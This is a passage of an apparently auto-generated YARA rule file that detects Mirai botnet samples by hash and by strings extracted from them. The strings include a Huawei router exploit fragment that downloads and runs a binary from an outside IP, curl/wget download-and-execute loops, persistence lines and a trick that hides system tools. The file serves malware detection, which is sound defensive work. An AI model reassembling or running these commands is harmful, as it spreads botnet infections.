      $s13 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s14 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s15 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b7ceaa35_Mirai_signature__bcce3295_Mirai_signature__c74ebc06_Mirai_signature__d0_7 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f185493b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash3 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash4 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash5 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash6 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash7 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash8 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash9 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash10 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash11 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash12 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
   strings:
      $s1 = "Host: %s.com" fullword ascii /* score: '26.00'*/
      $s2 = "X-Forwarded-Host: %s.com" fullword ascii /* score: '26.00'*/
      $s3 = "Origin: https://%s.com" fullword ascii /* score: '24.00'*/
      $s4 = "X-Akamai-Origin: https://www.example.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.microsoft.com" fullword ascii /* score: '21.00'*/
      $s6 = "Origin: https://www.apple.com" fullword ascii /* score: '21.00'*/
      $s7 = "Origin: https://www.instagram.com" fullword ascii /* score: '21.00'*/
      $s8 = "Referer: https://www.apple.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.microsoft.com/" fullword ascii /* score: '17.00'*/
      $s10 = "user-agent: %s" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.instagram.com/" fullword ascii /* score: '17.00'*/
      $s12 = "Referer: https://www.google.com/search?q=%s" fullword ascii /* score: '17.00'*/
      $s13 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s14 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s15 = "HttpUserAgents" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__c304c59e_Mirai_signature__d1b3d585_Mirai_signature__d7873b53_Mirai_signature__da895549_Mirai_signature__f1_8 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_c304c59e.elf, Mirai(signature)_d1b3d585.elf, Mirai(signature)_d7873b53.elf, Mirai(signature)_da895549.elf, Mirai(signature)_f126f5c9.elf, Mirai(signature)_fac662e8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c304c59e96eedb1c4a106184245fa757067ac63de1b26f4fb9b749fab9b85167"
      hash2 = "d1b3d585e48b597e0c9a4ad39ab9ac8776069569072cdc6d85b455f385df3568"
      hash3 = "d7873b53feb036ced3a7a8abd495eda5d8fba968e63d3502eae9a46be0ed0e32"
      hash4 = "da8955498add32bf0e2c074286f3543dee9975a1e84e94387205df463703a209"
      hash5 = "f126f5c9e00d2410ea652a7ed9792744b4018d415156857e57594dab242732dd"
      hash6 = "fac662e8ece923483c7baa3dba098467e1823e60ac63ab946e98f275c7bb62dd"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s6 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s7 = "/login" fullword ascii /* score: '12.00'*/
      $s8 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s9 = "Product description text" fullword ascii /* score: '10.00'*/
      $s10 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s11 = "This is a test message with some content" fullword ascii /* score: '9.00'*/
      $s12 = "\"Opera\";v=\"107\", \"Chromium\";v=\"121\", \"Not?A_Brand\";v=\"24\"" fullword ascii /* score: '9.00'*/
      $s13 = "200 Connection established" fullword ascii /* score: '9.00'*/
      $s14 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
      $s15 = "pass123" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b4201416_Mirai_signature__c304c59e_Mirai_signature__cd272f9a_Mirai_signature__d1b3d585_Mirai_signature__d3_9 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b4201416.elf, Mirai(signature)_c304c59e.elf, Mirai(signature)_cd272f9a.elf, Mirai(signature)_d1b3d585.elf, Mirai(signature)_d3fc0855.elf, Mirai(signature)_d4519c78.elf, Mirai(signature)_d4f0fe27.elf, Mirai(signature)_d539d2ed.elf, Mirai(signature)_d7873b53.elf, Mirai(signature)_da895549.elf, Mirai(signature)_eb144746.elf, Mirai(signature)_edb07abc.elf, Mirai(signature)_f126f5c9.elf, Mirai(signature)_fac662e8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b420141649d6504e0d5a231f746f01a3f610747dba7b17e47e1d8bb112479e48"
      hash2 = "c304c59e96eedb1c4a106184245fa757067ac63de1b26f4fb9b749fab9b85167"
      hash3 = "cd272f9af7cd4cbce9dbdc46ac6d93d24b6fb0a9e91c6716f47a8b6fd3ca7090"
      hash4 = "d1b3d585e48b597e0c9a4ad39ab9ac8776069569072cdc6d85b455f385df3568"
      hash5 = "d3fc08559d1e4bfa4f9f342c0a0f5686e8a3c79f67180320028a93c743aae42a"
      hash6 = "d4519c78702b5ff8fa900da590d8d91646a3e0de5eafd7f3f62068f6c165202d"
      hash7 = "d4f0fe27cbf49dfd1fba10f68b8855dd0c038383689c9c3771a9d6b7faff9e4e"
      hash8 = "d539d2ed50381a6ea9b0ba03a32d9ac801413b75f72375738d6a2c709f94fe5c"
      hash9 = "d7873b53feb036ced3a7a8abd495eda5d8fba968e63d3502eae9a46be0ed0e32"
      hash10 = "da8955498add32bf0e2c074286f3543dee9975a1e84e94387205df463703a209"
      hash11 = "eb1447467171aaf9ecafa97dde7c471b034c08f7f620630458f1f61a1784b679"
      hash12 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
      hash13 = "f126f5c9e00d2410ea652a7ed9792744b4018d415156857e57594dab242732dd"
      hash14 = "fac662e8ece923483c7baa3dba098467e1823e60ac63ab946e98f275c7bb62dd"
   strings:
      $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b52643bc_Mirai_signature__b9f808b7_Mirai_signature__c6e5e3de_Mirai_signature__dc512e5d_10 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b52643bc.elf, Mirai(signature)_b9f808b7.elf, Mirai(signature)_c6e5e3de.elf, Mirai(signature)_dc512e5d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b52643bcce41d7483fcc926ba1bf841dc5693549e9c0765c38f42eeaf199f831"
      hash2 = "b9f808b7c2d63b94a2b771b2888c6608c96234ba2f0aa227cb73579d6204ca2d"
      hash3 = "c6e5e3def1ed99838f5035777a2a9f02947e4b4d7420e7b3095a00ef4b22a3d9"
      hash4 = "dc512e5dda3851a35f7e1e3dd54769e3fedc513d3faa43a07309ed3b05a6b6b1"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $s2 = " -g 92.113.147.23 -l /tmp/kh -r /mips; /bin/busybox chmod 777 * /tmp/kh; /tmp/kh huawei)</NewStatusURL><NewDownloadURL>$(echo HU" ascii /* score: '30.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s7 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s8 = "cyppsxe20t3pu2m8bl88qsyd6uhhl22onwrjn76gs9tad69ms27q7a5knzmcfaj489791cmdwjfveeij9efmoieks6ob1t8eviul7z6fuhq1nkr6jn4piqisqxmabl4o" ascii /* score: '18.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)" fullword ascii /* score: '12.00'*/
      $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b2c308b4_Mirai_signature__bf754dbc_Mirai_signature__c5b68f9b_Mirai_signature__cd8f5c09_Mirai_signature__e3_11 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b2c308b4.elf, Mirai(signature)_bf754dbc.elf, Mirai(signature)_c5b68f9b.elf, Mirai(signature)_cd8f5c09.elf, Mirai(signature)_e3510286.elf, Mirai(signature)_e9b39678.elf, Mirai(signature)_f692fc8b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b2c308b4e9bf0aa29474550b82b687ca07648d8d814fb0564e60afa8d622ee29"
      hash2 = "bf754dbc36e70fe81668248e1aa553825154b0eae0b6b3ba120494d0bf2f2980"
      hash3 = "c5b68f9bef05fd8cadedc3d99742d801eaa44a3b02066511c74d96daba4db635"
      hash4 = "cd8f5c0927f3cac4d225a5fee8b8d409712cf1a7e7cea5b1b903c3caad59808f"
      hash5 = "e35102864c80d5b00e3d68918e4f5212d65efa2d3366dd7142203e787b65d43a"
      hash6 = "e9b396781f1f326b9b66ff4139e89de6b55ea9aae5b4d271396a49d97bd56599"
      hash7 = "f692fc8b862f4ab4c96c4dc9da877667245cfba00d686736d67fc20e40bf3301"
   strings:
      $s1 = "      rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s2 = "          rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s3 = "        rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s4 = "WantedBy=multi-user.target default.target" fullword ascii /* score: '17.00'*/
      $s5 = "After=network.target multi-user.target" fullword ascii /* score: '17.00'*/
      $s6 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s7 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s8 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s9 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s10 = "ps | grep uraskid | grep -v grep > /dev/null 2>&1 || %s skidstart &" fullword ascii /* score: '15.00'*/
      $s11 = "systemctl enable %s.service 2>/dev/null" fullword ascii /* score: '13.00'*/
      $s12 = "        TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
      $s13 = "        chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
      $s14 = "#!/bin/sh /etc/rc.common" fullword ascii /* score: '12.00'*/
      $s15 = "      TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b1534cad_Mirai_signature__c1aac960_Mirai_signature__c9922ed8_Mirai_signature__cca9f1d5_Mirai_signature__d3_12 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b1534cad.elf, Mirai(signature)_c1aac960.elf, Mirai(signature)_c9922ed8.elf, Mirai(signature)_cca9f1d5.elf, Mirai(signature)_d3c5f282.elf, Mirai(signature)_dac5eb94.elf, Mirai(signature)_fa11b522.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1534cad2766a77ea334271b358aeb27ca185db9a7dc13ff5478bbf1c24e9ace"
      hash2 = "c1aac960ee2a7d3bba9fb05fafe17e59b260111b69cb9917e4e1d7d6dc520792"
      hash3 = "c9922ed8521e186ce9fe038658d57d07df71bbcebc062d2451c78af0f659c97c"
      hash4 = "cca9f1d57e49da2c594217f582eac93e2c856b334723a8f4ac9ff598c79b0ec1"
      hash5 = "d3c5f28247776b236c137d28e0da5ac844666199aba1c7bb90bb332cccbdaa04"
      hash6 = "dac5eb94db75b7b648a507e155eb4f46eb1c8e90f8c04853a05b9384cc208a85"
      hash7 = "fa11b5223cfd7063f66e25e55bae431cc232e442bc21a017ddb2f3e40261e355"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "hexdump" fullword ascii /* score: '18.00'*/
      $s3 = "/etc/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s4 = "/usr/lib/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s5 = "  4) echo 'Fatal error: User is a script kiddie';;" fullword ascii /* score: '16.00'*/
      $s6 = "for c in ps kill grep ls cat readlink mount umount awk sed cut wget curl top netstat ss lsof reboot shutdown halt poweroff; do m" ascii /* score: '15.00'*/
      $s7 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '14.00'*/
      $s8 = "  0) echo 'Command not found: Your skill level';;" fullword ascii /* score: '12.00'*/
      $s9 = "kfifo /tmp/$c 2>/dev/null; mount --bind /tmp/$c /bin/$c 2>/dev/null; mount --bind /tmp/$c /usr/bin/$c 2>/dev/null; mount --bind " ascii /* score: '11.00'*/
      $s10 = "/tmp/$c /sbin/$c 2>/dev/null; mount --bind /tmp/$c /usr/sbin/$c 2>/dev/null; done" fullword ascii /* score: '11.00'*/
      $s11 = "/system/bin/shutdown" fullword ascii /* score: '10.00'*/
      $s12 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '10.00'*/
      $s13 = "/usr/bin/systemctl" fullword ascii /* score: '10.00'*/
      $s14 = "/sbin/service" fullword ascii /* score: '10.00'*/
      $s15 = "/usr/bin/service" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b1ef8d7a_Mirai_signature__b66de47e_Mirai_signature__b75909ad_Mirai_signature__c5f3d4bf_Mirai_signature__e2_13 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b1ef8d7a.elf, Mirai(signature)_b66de47e.elf, Mirai(signature)_b75909ad.elf, Mirai(signature)_c5f3d4bf.elf, Mirai(signature)_e2d4af23.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1ef8d7acdb8ff0c0c0d9444de98223dde7d240996bb314ef3e3750674f35b7c"
      hash2 = "b66de47ecd0ff70ddc9bd24b5109396306270527f0cd60a5d104b3c0296f7b5f"
      hash3 = "b75909ad2307983e0fd8de1048bb77b0ce12d0bedcd6257ac127a1df44cf561f"
      hash4 = "c5f3d4bfaef2eccaf02c3671b4de9abc6e52b109ab3f0ba02c81b16183fcb8ed"
      hash5 = "e2d4af236099d06c6f359cc77e34d22f603c2d27245e61d2bd7c5321dccfa0d0"
   strings:
      $s1 = "attack_tcpbypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_udpbypass" fullword ascii /* score: '15.00'*/
      $s3 = "disable_commands" fullword ascii /* score: '12.00'*/
      $s4 = "execv.c" fullword ascii /* score: '12.00'*/
      $s5 = "scan_getwc" fullword ascii /* score: '10.00'*/
      $s6 = "__scan_getc" fullword ascii /* score: '10.00'*/
      $s7 = "__scan_ungetc" fullword ascii /* score: '10.00'*/
      $s8 = "__GI_execv" fullword ascii /* score: '9.00'*/
      $s9 = "attack_tcpflood" fullword ascii /* score: '9.00'*/
      $s10 = "__init_scan_cookie" fullword ascii /* score: '8.00'*/
      $s11 = "__scan_cookie.c" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b4201416_Mirai_signature__cd272f9a_Mirai_signature__d3fc0855_Mirai_signature__d4519c78_Mirai_signature__d4_14 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b4201416.elf, Mirai(signature)_cd272f9a.elf, Mirai(signature)_d3fc0855.elf, Mirai(signature)_d4519c78.elf, Mirai(signature)_d4f0fe27.elf, Mirai(signature)_d539d2ed.elf, Mirai(signature)_eb144746.elf, Mirai(signature)_edb07abc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b420141649d6504e0d5a231f746f01a3f610747dba7b17e47e1d8bb112479e48"
      hash2 = "cd272f9af7cd4cbce9dbdc46ac6d93d24b6fb0a9e91c6716f47a8b6fd3ca7090"
      hash3 = "d3fc08559d1e4bfa4f9f342c0a0f5686e8a3c79f67180320028a93c743aae42a"
      hash4 = "d4519c78702b5ff8fa900da590d8d91646a3e0de5eafd7f3f62068f6c165202d"
      hash5 = "d4f0fe27cbf49dfd1fba10f68b8855dd0c038383689c9c3771a9d6b7faff9e4e"
      hash6 = "d539d2ed50381a6ea9b0ba03a32d9ac801413b75f72375738d6a2c709f94fe5c"
      hash7 = "eb1447467171aaf9ecafa97dde7c471b034c08f7f620630458f1f61a1784b679"
      hash8 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
   strings:
      $s1 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.yahoo.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.netflix.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.google.com/" fullword ascii /* score: '17.00'*/
      $s10 = "Referer: https://www.reddit.com/" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s12 = "X-Forwarded-For: 10.0.0.1" fullword ascii /* score: '14.00'*/
      $s13 = "X-Forwarded-For: 172.16.0.1" fullword ascii /* score: '14.00'*/
      $s14 = "X-Forwarded-For: 127.0.0.1" fullword ascii /* score: '14.00'*/
      $s15 = "X-Forwarded-For: 192.168.1.1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b1534cad_Mirai_signature__b161dba5_Mirai_signature__b1a2aa8b_Mirai_signature__b2c308b4_Mirai_signature__b5_15 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b1534cad.elf, Mirai(signature)_b161dba5.elf, Mirai(signature)_b1a2aa8b.elf, Mirai(signature)_b2c308b4.elf, Mirai(signature)_b551fa6c.elf, Mirai(signature)_b9b50507.elf, Mirai(signature)_bb77bff9.elf, Mirai(signature)_beb19cc4.elf, Mirai(signature)_bf754dbc.elf, Mirai(signature)_c02b2596.elf, Mirai(signature)_c123cce3.elf, Mirai(signature)_c1aac960.elf, Mirai(signature)_c38f861e.elf, Mirai(signature)_c4bd61d5.elf, Mirai(signature)_c4dfc581.elf, Mirai(signature)_c5b68f9b.elf, Mirai(signature)_c9922ed8.elf, Mirai(signature)_cae86c37.elf, Mirai(signature)_cc7db2c7.elf, Mirai(signature)_cca9f1d5.elf, Mirai(signature)_cd8f5c09.elf, Mirai(signature)_d3c5f282.elf, Mirai(signature)_d413ae70.elf, Mirai(signature)_d569e9b6.elf, Mirai(signature)_d7d7b7e5.elf, Mirai(signature)_d85b3eb2.elf, Mirai(signature)_d8a206f4.elf, Mirai(signature)_d8d31aef.elf, Mirai(signature)_dac5eb94.elf, Mirai(signature)_dbb3bb6e.elf, Mirai(signature)_dd22ab34.elf, Mirai(signature)_de0adbc9.elf, Mirai(signature)_df68ed24.elf, Mirai(signature)_dfcd48b1.elf, Mirai(signature)_e16a5e54.elf, Mirai(signature)_e1ff45b9.elf, Mirai(signature)_e2939a86.elf, Mirai(signature)_e3510286.elf, Mirai(signature)_e40c6fdc.elf, Mirai(signature)_e4acbf0a.elf, Mirai(signature)_e672e0b7.elf, Mirai(signature)_e68e4a98.elf, Mirai(signature)_e9b39678.elf, Mirai(signature)_ea80c817.elf, Mirai(signature)_ead4a102.elf, Mirai(signature)_ed8a7942.elf, Mirai(signature)_ee5c160e.elf, Mirai(signature)_ef075956.elf, Mirai(signature)_f0bb1000.elf, Mirai(signature)_f0e36723.elf, Mirai(signature)_f33bccf8.elf, Mirai(signature)_f532f12d.elf, Mirai(signature)_f68a2f3b.elf, Mirai(signature)_f692fc8b.elf, Mirai(signature)_f831fddd.elf, Mirai(signature)_f9361ef7.elf, Mirai(signature)_fa11b522.elf, Mirai(signature)_fa96cf95.elf, Mirai(signature)_fae30571.elf, Mirai(signature)_fc2117cb.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1534cad2766a77ea334271b358aeb27ca185db9a7dc13ff5478bbf1c24e9ace"
      hash2 = "b161dba5790533d43d1f14c7a906ba69746cf9433ffb5d27ddcf7ee0c201d8fb"
      hash3 = "b1a2aa8b3193267a595757628975f92f71bdd842620dabb654a6f9a1a75430ad"
      hash4 = "b2c308b4e9bf0aa29474550b82b687ca07648d8d814fb0564e60afa8d622ee29"
      hash5 = "b551fa6c16c8670ac26cf0eb9237e70bf663a22039abd9e8afa14faca03b681d"
